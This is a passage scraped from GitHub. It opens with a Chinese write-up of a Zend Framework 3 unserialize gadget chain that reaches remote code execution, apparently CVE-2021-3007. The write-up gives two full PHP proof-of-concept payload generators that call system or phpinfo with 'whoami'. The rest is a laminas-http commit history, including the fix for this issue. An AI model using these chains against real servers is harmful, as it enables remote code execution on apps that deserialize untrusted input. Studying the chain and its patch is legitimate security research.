    return $this->options['callback'];
}
```

而`args`来自`$args = [$value];`，也就是函数的第一个参数，即`htmlAttribs()`中的`$key`，所有参数可控，可以rce，最终调用栈如下
[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/11.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/11.png)

#### poc

要注意zend framework3采用了自动加载类的方式，会自动包含我们需要的类
[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/12.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/12.png)

```
<?php

namespace Zend\Http\Response {
    class Stream
    {
        protected $cleanup = true;
        protected $streamName;

        public function __construct($streamName)
        {
            $this->streamName = $streamName;
        }
    }
}

namespace Zend\View\Helper{
    class Gravatar{
        protected $view;
//        protected $attributes = ["whoami"=>'a'];
        protected $attributes = [1=>'a'];
        public function __construct($view)
        {
            $this->view=$view;
        }
    }
}

namespace Zend\View\Renderer{
    class PhpRenderer{
        private $__helpers;
        public function __construct($__helpers)
        {
            $this->__helpers = $__helpers;
        }
    }
}
namespace Zend\Config{
    class ReaderPluginManager{
        protected $services;
        protected $instanceOf ="Zend\Validator\Callback";
        public function __construct($services){
            $this->services = ["escapehtml"=>$services,"escapehtmlattr"=>$services];
        }
    }
}
namespace Zend\Validator{
    class Callback{
        protected $options = [
            'callback'         => 'phpinfo',
            'callbackOptions'  => []
        ];
    }
}

namespace {
    $e = new Zend\Validator\Callback();
    $d = new Zend\Config\ReaderPluginManager($e);
    $c = new Zend\View\Renderer\PhpRenderer($d);
    $b = new Zend\View\Helper\Gravatar($c);
    $a = new Zend\Http\Response\Stream($b);
    echo base64_encode(serialize($a));
}
```

#### 结果

[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/13.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/13.png)

### 方法二：Zend\Config\Config

另一种方法是寻找更方便的有`get()`的方法，我找到了`Zend\Config\Config`
[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/14.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/14.png)

可以直接返回我们想要的数据，在`$key = $escaper($key)`rce
调用栈如下
[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/16.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/16.png)

#### poc

```
<?php

namespace Zend\Http\Response {
    class Stream
    {
        protected $cleanup = true;
        protected $streamName;

        public function __construct($streamName)
        {
            $this->streamName = $streamName;
        }
    }
}

namespace Zend\View\Helper{
    class Gravatar{
        protected $view;
//        protected $attributes = ["whoami"=>'a'];
        protected $attributes = ['whoami'=>1];
        public function __construct($view)
        {
            $this->view=$view;
        }
    }
}

namespace Zend\View\Renderer{
    class PhpRenderer{
        private $__helpers;
        public function __construct($__helpers)
        {
            $this->__helpers = $__helpers;
        }
    }
}

namespace Zend\Config{
    class Config{
        protected $data = [
            "escapehtml"=>'system',
            "escapehtmlattr"=>'phpinfo'
        ];
    }
}

namespace {
    $d = new Zend\Config\Config();
    $c = new Zend\View\Renderer\PhpRenderer($d);
    $b = new Zend\View\Helper\Gravatar($c);
    $a = new Zend\Http\Response\Stream($b);
    echo base64_encode(serialize($a));
}
```

#### 结果

[![](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/15.png)](https://raw.githubusercontent.com/Ling-Yizhou/zendframework3-/main/15.png)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_ca421bed_20250114_224120.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flaminas%2Flaminas-http%2Fcommits%2F2.15.x%2Fsrc%2FResponse%2FStream.php)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flaminas%2Flaminas-http%2Fcommits%2F2.15.x%2Fsrc%2FResponse%2FStream.php)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fcommits%2Fshow&source=header-repo&source_repo=laminas%2Flaminas-http)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[laminas](/laminas)
/
**[laminas-http](/laminas/laminas-http)**
Public

* [Notifications](/login?return_to=%2Flaminas%2Flaminas-http) You must be signed in to change notification settings
* [Fork
  30](/login?return_to=%2Flaminas%2Flaminas-http)
* [Star
   36](/login?return_to=%2Flaminas%2Flaminas-http)

* [Code](/laminas/laminas-http/tree/2.15.x)
* [Issues
  5](/laminas/laminas-http/issues)
* [Pull requests
  2](/laminas/laminas-http/pulls)
* [Actions](/laminas/laminas-http/actions)
* [Projects
  0](/laminas/laminas-http/projects)
* [Security](/laminas/laminas-http/security)
* [Insights](/laminas/laminas-http/pulse)

Additional navigation options

* [Code](/laminas/laminas-http/tree/2.15.x)
* [Issues](/laminas/laminas-http/issues)
* [Pull requests](/laminas/laminas-http/pulls)
* [Actions](/laminas/laminas-http/actions)
* [Projects](/laminas/laminas-http/projects)
* [Security](/laminas/laminas-http/security)
* [Insights](/laminas/laminas-http/pulse)

# Commits

## Breadcrumbs

History for

1. [laminas-http](/laminas/laminas-http/commits)
2. [src](/laminas/laminas-http/commits/2.15.x/src)
3. [Response](/laminas/laminas-http/commits/2.15.x/src/Response)
4. [Stream.php](/laminas/laminas-http/commits/2.15.x/src/Response/Stream.php)
on[2.15.x](/laminas/laminas-http/tree/2.15.x)
## User selector

All users
## Datepicker

All time
## Commit History

### Commits on Sep 9, 2021

* #### [qa: apply laminas-coding-standard 2.2 ruleset](/laminas/laminas-http/commit/efe45b35c727e86760164a50954a990563aa165e "qa: apply laminas-coding-standard 2.2 ruleset Signed-off-by: Matthew Weier O'Phinney <matthew@weierophinney.net>")

  Show description for efe45b3[![weierophinney](https://avatars.githubusercontent.com/u/25943?v=4&size=32)](/weierophinney)[weierophinney](/laminas/laminas-http/commits?author=weierophinney)committed[efe45b3](/laminas/laminas-http/commit/efe45b35c727e86760164a50954a990563aa165e)Copy full SHA for efe45b3
### Commits on Jan 5, 2021

* #### [fix: do not unlink file if it is not a file](/laminas/laminas-http/commit/eab608e10896270416aae7ffce36cc48072aa796 "fix: do not unlink file if it is not a file Per https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3007 there is a possibility IF A USER HAS USED UNSERIALIZE() ON UNTRUSTED DATA of the stream response destructor potentially invoking a class `__toString()` implementation, and thus triggering a vulnerability. This patch ensures that given that scenario, the stream response destructor does not use an object as a string for purposes of unlinking a potential stream filename. Signed-off-by: Matthew Weier O'Phinney <matthew@weierophinney.net>")

  Show description for eab608e[![weierophinney](https://avatars.githubusercontent.com/u/25943?v=4&size=32)](/weierophinney)[weierophinney](/laminas/laminas-http/commits?author=weierophinney)committed[eab608e](/laminas/laminas-http/commit/eab608e10896270416aae7ffce36cc48072aa796)Copy full SHA for eab608e
### Commits on Dec 31, 2019

* #### [Rewriting as Laminas Project package](/laminas/laminas-http/commit/f490880a54896f674c8ab1ef2e3771067b104b7d "Rewriting as Laminas Project package")

  [![weierophinney](https://avatars.githubusercontent.com/u/25943?v=4&size=32)](/weierophinney)[weierophinney](/laminas/laminas-http/commits?author=weierophinney)committed[f490880](/laminas/laminas-http/commit/f490880a54896f674c8ab1ef2e3771067b104b7d)Copy full SHA for f490880
### Commits on Dec 4, 2019

* #### [Improve multiple PHPDocs return tags](/laminas/laminas-http/commit/5f544c5f35b38e7d3ce373c977d0173c03412ff6 "Improve multiple PHPDocs return tags Use $this/static instead of class/interface name")

  Show description for 5f544c5[![michalbundyra](https://avatars.githubusercontent.com/u/7423207?v=4&size=32)](/michalbundyra)[michalbundyra](/laminas/laminas-http/commits?author=michalbundyra)committed[5f544c5](/laminas/laminas-http/commit/5f544c5f35b38e7d3ce373c977d0173c03412ff6)Copy full SHA for 5f544c5
### Commits on Oct 13, 2017

* #### [Merge branch 'hotfix/125' into develop](/laminas/laminas-http/commit/c25814dc2c1ce103dc6ae8306f0932841cb41df4 "Merge branch 'hotfix/125' into develop Forward port #125")

  Show description for c25814d[![Xerkus](https://avatars.githubusercontent.com/u/725842?v=4&size=32)](/Xerkus)[Xerkus](/laminas/laminas-http/commits?author=Xerkus)committed[c25814d](/laminas/laminas-http/commit/c25814dc2c1ce103dc6ae8306f0932841cb41df4)Copy full SHA for c25814d
* #### [replace count() usage to empty() when possible](/laminas/laminas-http/commit/46f531c1574cd0d519cf83c1647004963e4d36ff " replace count() usage to empty() when possible")

   ![samsonasik](https://avatars.githubusercontent.com/u/459648?v=4&size=32)![Xerkus](https://avatars.githubusercontent.com/u/725842?v=4&size=32)[samsonasik](/laminas/laminas-http/commits?author=samsonasik)authored and[Xerkus](/laminas/laminas-http/commits?author=Xerkus)committed[46f531c](/laminas/laminas-http/commit/46f531c1574cd0d519cf83c1647004963e4d36ff)Copy full SHA for 46f531c
### Commits on Mar 5, 2017

* #### [Concatenation fixes](/laminas/laminas-http/commit/8f85cd6d48277209c3edcf75ac1aca6f9d64289a "Concatenation fixes")

  [![michalbundyra](https://avatars.githubusercontent.com/u/7423207?v=4&size=32)](/michalbundyra)[michalbundyra](/laminas/laminas-http/commits?author=michalbundyra)committed[8f85cd6](/laminas/laminas-http/commit/8f85cd6d48277209c3edcf75ac1aca6f9d64289a)Copy full SHA for 8f85cd6
* #### [PHPDocs fixes](/laminas/laminas-http/commit/5e50b9a6051e1593bc5bf0c0e65ef9cdfcb08da0 "PHPDocs fixes")

  [![michalbundyra](https://avatars.githubusercontent.com/u/7423207?v=4&size=32)](/michalbundyra)[michalbundyra](/laminas/laminas-http/commits?author=michalbundyra)committed[5e50b9a](/laminas/laminas-http/commit/5e50b9a6051e1593bc5bf0c0e65ef9cdfcb08da0)Copy full SHA for 5e50b9a
* #### [Removed redundant null values on properties](/laminas/laminas-http/commit/dc4e60d2731d7595ad1124d77b378c2bb87fd6e9 "Removed redundant null values on properties")

  [![michalbundyra](https://avatars.githubusercontent.com/u/7423207?v=4&size=32)](/michalbundyra)[michalbundyra](/laminas/laminas-http/commits?author=michalbundyra)committed[dc4e60d](/laminas/laminas-http/commit/dc4e60d2731d7595ad1124d77b378c2bb87fd6e9)Copy full SHA for dc4e60d
* #### [Added docheader tool to check license headers](/laminas/laminas-http/commit/ce04189a02f338a33ff7671e2e19483846974fee "Added docheader tool to check license headers and updated license headers in files")

  Show description for ce04189[![michalbundyra](https://avatars.githubusercontent.com/u/7423207?v=4&size=32)](/michalbundyra)[michalbundyra](/laminas/laminas-http/commits?author=michalbundyra)committed[ce04189](/laminas/laminas-http/commit/ce04189a02f338a33ff7671e2e19483846974fee)Copy full SHA for ce04189
### Commits on Nov 20, 2016

* #### [Automated CS fixes](/laminas/laminas-http/commit/4dc58dbaae187b650ede0405af3ecee54cee0c3a "Automated CS fixes")

  [![Koopzington](https://avatars.githubusercontent.com/u/3015529?v=4&size=32)](/Koopzington)[Koopzington](/laminas/laminas-http/commits?author=Koopzington)committed[4dc58db](/laminas/laminas-http/commit/4dc58dbaae187b650ede0405af3ecee54cee0c3a)Copy full SHA for 4dc58db
### Commits on Jun 5, 2015

* #### [[cs] Use PHP short array syntax](/laminas/laminas-http/commit/da6dcc5c89534853ac13df309ef579473db0b1bf "[cs] Use PHP short array syntax Since PHP 5.4 arrays can be defined with brackets ([]) instead the function")

  Show description for da6dcc5[![Maks3w](https://avatars.githubusercontent.com/u/1301698?v=4&size=32)](/Maks3w)[Maks3w](/laminas/laminas-http/commits?author=Maks3w)committed[da6dcc5](/laminas/laminas-http/commit/da6dcc5c89534853ac13df309ef579473db0b1bf)Copy full SHA for da6dcc5
### Commits on May 4, 2015

* #### [CS fixes as reported by php-cs-fixer](/laminas/laminas-http/commit/d900351efa4fa49332a039ee724d1f3756a5bc54 "CS fixes as reported by php-cs-fixer")

  [![weierophinney](https://avatars.githubusercontent.com/u/25943?v=4&size=32)](/weierophinney)[weierophinney](/laminas/laminas-http/commits?author=weierophinney)committed[d900351](/laminas/laminas-http/commit/d900351efa4fa49332a039ee724d1f3756a5bc54)Copy full SHA for d900351
### Commits on Apr 3, 2015

* #### [uses !== null instead of != null check](/laminas/laminas-http/commit/f1e498f120fb36fc343e9211174633d1650b4b66 "uses !== null instead of != null check")

  [![samsonasik](https://avatars.githubusercontent.com/u/459648?v=4&size=32)](/samsonasik)[samsonasik](/laminas/laminas-http/commits?author=samsonasik)committed[f1e498f](/laminas/laminas-http/commit/f1e498f120fb36fc343e9211174633d1650b4b66)Copy full SHA for f1e498f
### Commits on Jan 1, 2015

* #### [Happy new year 2015](/laminas/laminas-http/commit/71810094c65fd5cf0af97349d8a1cb0b533d6120 "Happy new year 2015")

   ![samsonasik](https://avatars.githubusercontent.com/u/459648?v=4&size=32)![Ocramius](https://avatars.githubusercontent.com/u/154256?v=4&size=32)[samsonasik](/laminas/laminas-http/commits?author=samsonasik)authored and[Ocramius](/laminas/laminas-http/commits?author=Ocramius)committed[7181009](/laminas/laminas-http/commit/71810094c65fd5cf0af97349d8a1cb0b533d6120)Copy full SHA for 7181009
### Commits on Apr 2, 2014

* #### [Minor conditional simplification for](/laminas/laminas-http/commit/ba049644d0ad61ed9304df6ce162bd03ff3100ba "Minor conditional simplification for zendframework/zf2#6027") [zendframework/zendframework#6027](https://github.com/zendframework/zendframework/pull/6027)

  [![Ocramius](https://avatars.githubusercontent.com/u/154256?v=4&size=32)](/Ocramius)[Ocramius](/laminas/laminas-http/commits?author=Ocramius)committed[ba04964](/laminas/laminas-http/commit/ba049644d0ad61ed9304df6ce162bd03ff3100ba)Copy full SHA for ba04964
* #### [Allow empty response strings in \Zend\Http\Response::fromStream](/laminas/laminas-http/commit/c6432aff858e8c9d1b5bf560fafd9b56d602bbb9 "Allow empty response strings in \Zend\Http\Response::fromStream")

   ![alexhenrie](https://avatars.githubusercontent.com/u/5951993?v=4&size=32)![Ocramius](https://avatars.githubusercontent.com/u/154256?v=4&size=32)[alexhenrie](/laminas/laminas-http/commits?author=alexhenrie)authored and[Ocramius](/laminas/laminas-http/commits?author=Ocramius)committed[c6432af](/laminas/laminas-http/commit/c6432aff858e8c9d1b5bf560fafd9b56d602bbb9)Copy full SHA for c6432af
### Commits on Jan 2, 2014

* #### [Back-port of copyright changes to master](/laminas/laminas-http/commit/6492fc4c6b80f9f8d7badcbbec261490855235f7 "Back-port of copyright changes to master Diff based on PR zendframework/zf2#5654 (git diff a961e19..fd935cf), applied skipping unmatched files")

  Show description for 6492fc4![author](https://github.githubassets.com/images/gravatars/gravatar-user-420.png?size=32)Ralph Schindlercommitted[6492fc4](/laminas/laminas-http/commit/6492fc4c6b80f9f8d7badcbbec261490855235f7)Copy full SHA for 6492fc4
### Commits on Mar 19, 2013

* #### [fix typos](/laminas/laminas-http/commit/762559d9d2cdf5fa6d459885497b800ca883e2b9 "fix typos")

  [![samsonasik](https://avatars.githubusercontent.com/u/459648?v=4&size=32)](/samsonasik)[samsonasik](/laminas/laminas-http/commits?author=samsonasik)committed[762559d](/laminas/laminas-http/commit/762559d9d2cdf5fa6d459885497b800ca883e2b9)Copy full SHA for 762559d
### Commits on Jan 21, 2013

* #### [Removed all](/laminas/laminas-http/commit/b1a9ed80e28a1060157091460c1dd8fee9d78af2 "Removed all @category, @package, and @subpackage annotations - Per zendframework/zf2#2743, and following on zendframework/zf2#2953 and discussion on the ML - Also removes empty docblocks, and empty lines at the end of docblocks - Library only; phpdoc is never run on tests anyways, and did not want to potentially create breakage due to test expectations that relied on annotations. At this time, all tests pass.") [@category](https://github.com/category)[,](/laminas/laminas-http/commit/b1a9ed80e28a1060157091460c1dd8fee9d78af2 "Removed all @category, @package, and @subpackage annotations - Per zendframework/zf2#2743, and following on zendframework/zf2#2953 and discussion on the ML - Also removes empty docblocks, and empty lines at the end of docblocks - Library only; phpdoc is never run on tests anyways, and did not want to potentially create breakage due to test expectations that relied on annotations. At this time, all tests pass.") [@Package](https://github.com/Package)[, and @subpackage annotations](/laminas/laminas-http/commit/b1a9ed80e28a1060157091460c1dd8fee9d78af2 "Removed all @category, @package, and @subpackage annotations - Per zendframework/zf2#2743, and following on zendframework/zf2#2953 and discussion on the ML - Also removes empty docblocks, and empty lines at the end of docblocks - Library only; phpdoc is never run on tests anyways, and did not want to potentially create breakage due to test expectations that relied on annotations. At this time, all tests pass.")

  Show description for b1a9ed8[![weierophinney](https://avatars.githubusercontent.com/u/25943?v=4&size=32)](/weierophinney)[weierophinney](/laminas/laminas-http/commits?author=weierophinney)committed[b1a9ed8](/laminas/laminas-http/commit/b1a9ed80e28a1060157091460c1dd8fee9d78af2)Copy full SHA for b1a9ed8
* #### [[](/laminas/laminas-http/commit/d08fb3b0f3563b8058ec79a233ec7f29f97b9ea6 "[zendframework/zf2#3498] Minor logic changes - Cache return of method call -- prevents multiple fetches - use \"null !==\" instead of \"!is_null\" (internal consistency)")[zendframework/zendframework#3498](https://github.com/zendframework/zendframework/pull/3498)[] Minor logic changes](/laminas/laminas-http/commit/d08fb3b0f3563b8058ec79a233ec7f29f97b9ea6 "[zendframework/zf2#3498] Minor logic changes - Cache return of method call -- prevents multiple fetches - use \"null !==\" instead of \"!is_null\" (internal consistency)")

  Show description for d08fb3b[![weierophinney](https://avatars.githubusercontent.com/u/25943?v=4&size=32)](/weierophinney)[weierophinney](/laminas/laminas-http/commits?author=weierophinney)committed[d08fb3b](/laminas/laminas-http/commit/d08fb3b0f3563b8058ec79a233ec7f29f97b9ea6)Copy full SHA for d08fb3b
### Commits on Jan 20, 2013

* #### [add method to Zend\Http\Response\Stream](/laminas/laminas-http/commit/ae50be65378617f86e71ac7827779c0b86adc223 "add method to Zend\Http\Response\Stream the content length is now exposed with getters and setters fixed phpdoc change atrribute $this->contentlength to getContentLength()")

  Show description for ae50be6[![prolic](https://avatars.githubusercontent.com/u/394428?v=4&size=32)](/prolic)[prolic](/laminas/laminas-http/commits?author=prolic)committed[ae50be6](/laminas/laminas-http/commit/ae50be65378617f86e71ac7827779c0b86adc223)Copy full SHA for ae50be6
* #### [add method to Zend\Http\Response\Stream](/laminas/laminas-http/commit/b4f8f53a79549b5419137c084766322f02941f34 "add method to Zend\Http\Response\Stream the content length is now exposed with getters and setters")

  Show description for b4f8f53[![prolic](https://avatars.githubusercontent.com/u/394428?v=4&size=32)](/prolic)[prolic](/laminas/laminas-http/commits?author=prolic)committed[b4f8f53](/laminas/laminas-http/commit/b4f8f53a79549b5419137c084766322f02941f34)Copy full SHA for b4f8f53
### Commits on Jan 7, 2013

* #### [Merge branch 'fix/cs-concistency' of git://github.com/samsonasik/zf2 into hotfix/3342](/laminas/laminas-http/commit/03f98d41d6410fe274e9956ff195203ffe3894b1 "Merge branch 'fix/cs-concistency' of git://github.com/samsonasik/zf2 into hotfix/3342")

  [![weierophinney](https://avatars.githubusercontent.com/u/25943?v=4&size=32)](/weierophinney)[weierophinney](/laminas/laminas-http/commits?author=weierophinney)committed[03f98d4](/laminas/laminas-http/commit/03f98d41d6410fe274e9956ff195203ffe3894b1)Copy full SHA for 03f98d4
### Commits on Jan 4, 2013

* #### [boolean to bool in docblock](/laminas/laminas-http/commit/1cc7887c153b7494fc402d0cbd3b002d774f4b3e "boolean to bool in docblock")

  [![samsonasik](https://avatars.githubusercontent.com/u/459648?v=4&size=32)](/samsonasik)[samsonasik](/laminas/laminas-http/commits?author=samsonasik)committed[1cc7887](/laminas/laminas-http/commit/1cc7887c153b7494fc402d0cbd3b002d774f4b3e)Copy full SHA for 1cc7887
### Commits on Jan 1, 2013

* #### [update copyright year : change 2012 to 2013](/laminas/laminas-http/commit/6802cad2bf910ced2216fc98d457a3dd90e8406f "update copyright year : change 2012 to 2013")

  [![samsonasik](https://avatars.githubusercontent.com/u/459648?v=4&size=32)](/samsonasik)[samsonasik](/laminas/laminas-http/commits?author=samsonasik)committed[6802cad](/laminas/laminas-http/commit/6802cad2bf910ced2216fc98d457a3dd90e8406f)Copy full SHA for 6802cad
### Commits on Aug 31, 2012

* #### [[](/laminas/laminas-http/commit/734f9f220a79bff62fac631c8f971b6e1954f99f "[zendframework/zf2#2284][ZF2-507] Updated README - Notice about Date header")[zendframework/zendframework#2284](https://github.com/zendframework/zendframework/pull/2284)[][ZF2-507] Updated README](/laminas/laminas-http/commit/734f9f220a79bff62fac631c8f971b6e1954f99f "[zendframework/zf2#2284][ZF2-507] Updated README - Notice about Date header")

  Show description for 734f9f2[![weierophinney](https://avatars.githubusercontent.com/u/25943?v=4&size=32)](/weierophinney)[weierophinney](/laminas/laminas-http/commits?author=weierophinney)committed[734f9f2](/laminas/laminas-http/commit/734f9f220a79bff62fac631c8f971b6e1954f99f)Copy full SHA for 734f9f2
Loading

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


